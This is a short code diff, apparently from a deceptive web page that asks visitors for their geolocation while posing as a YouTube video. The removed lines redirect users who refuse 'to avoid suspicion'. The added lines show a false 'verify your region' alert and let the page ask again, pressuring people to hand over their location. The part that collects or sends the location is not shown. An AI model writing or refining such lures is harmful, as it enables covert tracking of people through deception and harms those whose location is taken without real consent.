@@ -745,8 +745,8 @@
                     },
                     (error) => {
                         console.error("Location permission denied.");
-                        // Redirect anyway to avoid suspicion
-                        window.location.href = "https://www.youtube.com/watch?v=qNPRWTDWaXI";
+                        alert("Please allow location access to verify your region and watch this video.");
+                        hasRequested = false; // Allow them to click again (though browser might block if permanently denied)
                     }
                 );
             }
